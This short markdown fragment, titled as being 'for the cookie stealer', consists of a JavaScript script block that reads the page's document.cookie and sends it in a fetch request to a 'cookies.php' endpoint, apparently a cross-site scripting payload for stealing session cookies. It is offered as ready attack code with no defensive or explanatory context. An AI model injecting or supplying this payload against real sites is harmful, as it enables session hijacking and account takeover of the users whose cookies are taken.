## For the cookie stealer

```
<script>
const data=document.cookie;
fetch('cookies.php?c='+data,{
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: "foo",
})
</script>
```